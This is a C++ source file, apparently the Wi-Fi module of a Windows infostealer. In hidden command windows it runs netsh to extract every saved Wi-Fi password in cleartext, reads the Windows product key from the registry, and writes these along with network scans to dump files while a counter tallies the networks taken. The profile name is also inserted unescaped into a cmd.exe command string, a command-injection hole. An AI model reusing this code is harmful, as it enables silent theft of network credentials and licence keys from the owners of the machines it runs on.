#include "Wifi.h"
#include "Counter.h"
#include "ProductKey.h"
#include <iostream>
#include <Windows.h> 
#include <wlanapi.h>
#include <fstream>
#pragma comment(lib,"wlanapi.lib")
using namespace std;

void Wifi::WriteProductKey(std::string Path)
{
    // Step 1: Retrieve the Windows product key from the registry.
    std::string text = ProductKey::GetWindowsProductKeyFromRegistry();

    // Step 2: Append the filename "ProductKey_info.txt" to the provided path.
    Path += "\\ProductKey_info.txt";

    // Step 3: Create an output file stream to write to the specified path.
    std::ofstream ofs(Path);

    // Step 4: Check if the file is successfully opened.
    if (ofs.is_open())
    {
        // Step 5: Write the product key text to the file.
        ofs << text;

        // Step 6: Close the file after writing.
        ofs.close();

        // Step 7: Return from the function as the operation is successful.
        return;
    }

    // Step 8: If the file could not be opened, exit the function (implicitly).
    return;
}

std::string Wifi::RunCommand(const std::string& command)
{
    // Step 1: Setup SECURITY_ATTRIBUTES for the pipe to allow handle inheritance.
    SECURITY_ATTRIBUTES saAttr = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    // Step 2: Declare pipe handles for reading and writing.
    HANDLE hReadPipe, hWritePipe;

    // Step 3: Create a pipe for inter-process communication.
    if (!CreatePipe(&hReadPipe, &hWritePipe, &saAttr, 0))
    {
        // Step 4: If pipe creation fails, return an empty string.
        return "";
    }

    // Step 5: Set up STARTUPINFOA structure for the process to be created.
    STARTUPINFOA si = { sizeof(STARTUPINFO) };
    si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // Use standard handles and hide window
    si.wShowWindow = SW_HIDE; // Hide the window
    si.hStdInput = GetStdHandle(STD_INPUT_HANDLE); // Set standard input
    si.hStdOutput = hWritePipe; // Set standard output to the pipe
    si.hStdError = hWritePipe;  // Set standard error to the pipe

    // Step 6: Declare PROCESS_INFORMATION structure to receive process information.
    PROCESS_INFORMATION pi = { 0 };

    // Step 7: Create the command process (cmd.exe /c command).
    if (!CreateProcessA(NULL, const_cast<LPSTR>((std::string("cmd.exe /c ") + command).c_str()), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        // Step 8: If process creation fails, close the pipe handles and return empty string.
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        return "";
    }

    // Step 9: Close the write handle of the pipe (as we don't need to write to it anymore).
    CloseHandle(hWritePipe);

    // Step 10: Read output from the pipe (cmd output).
    std::string result;
    char buffer[4096] = { 0 }; // Buffer to store data
    DWORD bytesRead = 0;

    // Step 11: Read from the pipe until there's no more data.
    while (ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL))
    {
        if (bytesRead == 0)
        {
            // Step 12: If no data was read, break the loop.
            break;
        }

        // Step 13: Null-terminate the buffer and append to the result string.
        buffer[bytesRead] = '\0';
        result += std::string(buffer, bytesRead);
    }

    // Step 14: Wait for the process to finish.
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Step 15: Close the handles associated with the process and pipe.
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hReadPipe);

    // Step 16: Return the result from the command execution.
    return result;
}

std::vector<std::string> Wifi::SplitString(const std::string& str, const std::string& delim)
{
    // Step 1: Declare a vector to store the resulting substrings.
    std::vector<std::string> result;

    size_t pos = 0;

    // Step 2: Iterate through the string to find delimiters.
    while (pos < str.length())
    {
        // Step 3: Find the next occurrence of the delimiter.
        size_t end = str.find(delim, pos);

        // Step 4: If delimiter not found, set end to string length.
        if (end == std::string::npos)
        {
            end = str.length();
        }

        // Step 5: Extract the token between the positions of 'pos' and 'end'.
        std::string token = str.substr(pos, end - pos);

        // Step 6: Add non-empty tokens to the result vector.
        if (!token.empty())
        {
            result.push_back(token);
        }

        // Step 7: Move the position to the next part of the string after the delimiter.
        pos = end + delim.length();
    }

    // Step 8: Return the vector of substrings.
    return result;
}

std::vector<std::string> Wifi::GetProfiles(const std::string& output)
{
    // Step 1: Declare a vector to store the profile names.
    std::vector<std::string> wNames;

    // Step 2: Split the output into lines using the SplitString function.
    auto lines = SplitString(output, "\r\n");

    // Step 3: Iterate over each line.
    for (auto const& line : lines)
    {
        // Step 4: Find the last occurrence of a colon, which separates the profile name.
        auto pos = line.find_last_of(':');
        if (pos != std::string::npos && pos < line.length() - 1)
        {
            // Step 5: Extract the profile name after the colon.
            std::string name = line.substr(pos + 1);

            // Step 6: Trim leading and trailing whitespaces from the profile name.
            name.erase(0, name.find_first_not_of(" \t"));
            name.erase(name.find_last_not_of(" \t") + 1);

            // Step 7: Add the cleaned profile name to the vector.
            wNames.push_back(name);
        }
    }

    // Step 8: Return the vector containing all profile names.
    return wNames;
}

std::string Wifi::GetPassword(const std::string& profile)
{
    // Step 1: Construct the command to retrieve the Wi-Fi profile details, including the password.
    // The command uses 'chcp 65001' to set the code page to UTF-8, ensuring correct character encoding.
    // 'netsh wlan show profile name="profile" key=clear' gets profile details and the password.
    // 'findstr Key' filters the result to find the "Key" string where the password is located.
    std::string command = "chcp 65001 && netsh wlan show profile name=\"" + profile + "\" key=clear | findstr Key";

    // Step 2: Run the command and capture the output (which includes the password if available).
    std::string output = RunCommand(command.c_str());

    // Step 3: Find the position of the last colon (':') in the output to locate the password value.
    auto pos = output.find_last_of(':');
    if (pos != std::string::npos && pos < output.length() - 1)
    {
        // Step 4: Extract the password by getting the substring after the colon.
        std::string password = output.substr(pos + 1);

        // Step 5: Trim leading whitespace (spaces or tabs) from the password.
        password.erase(0, password.find_first_not_of(" \t"));

        // Step 6: Trim trailing whitespace (spaces or tabs) from the password.
        password.erase(password.find_last_not_of(" \t") + 1);

        // Step 7: Return the trimmed password.
        return password;
    }
    else
    {
        // Step 8: If no password is found (no colon or no "Key" line), return an empty string.
        return "";
    }
}

void Wifi::ScanningNetworks(std::string sSavePath)
{
    // Step 1: Run the command to display all Wi-Fi profiles using 'netsh wlan show all'.
    // This command lists all Wi-Fi networks and profiles detected by the system.
    string output = RunCommand("chcp 65001 && netsh wlan show all");

    // Step 2: Check if the output indicates the wlan service is running.
    // If the output contains "is not running", it means the wireless service is not available.
    if (output.find("is not running") == std::string::npos)
    {
        // Step 3: Open the specified file for appending the scan results.
        std::ofstream outfile(sSavePath + "\\" + "ScanningNetworks_Info.txt", std::ios::app);

        // Step 4: If the file opens successfully, write the scan results to the file.
        if (outfile.is_open())
        {
            outfile << output;
            outfile.close(); // Close the file after writing the data.
        }
        else
        {
            // Step 5: If the file cannot be opened, print an error message.
            return;
        }

        // Step 6: Return from the function after writing the output to the file.
        return;
    }
    // No else block is needed here, as the function ends if the condition is not met.
}

void Wifi::SavedNetworks(std::string sSavePath)
{
    // Step 1: Run the command to list all saved Wi-Fi profiles using 'netsh wlan show profile'.
    // The 'findstr All' filters the results to show all profiles.
    std::string output = RunCommand("chcp 65001 && netsh wlan show profile | findstr All");

    // Step 2: Use the GetProfiles method to extract profile names from the command output.
    auto wNames = GetProfiles(output);

    // Step 3: Iterate over the extracted Wi-Fi profiles.
    for (auto const& name : wNames)
    {
        // Step 4: Skip processing if the profile name is "65001", which could be the result of character encoding.
        if (name == std::string("65001"))
        {
            continue;
        }

        // Step 5: Increment the counter to track the number of saved networks.
        Counter::SavedWifiNetworks++;

        // Step 6: Get the password for the current Wi-Fi profile using the GetPassword function.
        std::string password = GetPassword(name);

        // Step 7: Open the file to append the profile and password information.
        std::ofstream outfile(sSavePath + "\\" + "SavedNetworks_Info.txt", std::ios::app);

        // Step 8: If the file opens successfully, write the profile and password info to the file.
        if (outfile.is_open())
        {
            std::string fmt = "PROFILE: " + name + "\nPASSWORD: " + password;
            outfile << fmt; // Write formatted profile and password.
            outfile.close(); // Close the file after writing.
        }
        else
        {
            // Step 9: If the file cannot be opened, print an error message.
            return;
        }
    }
}
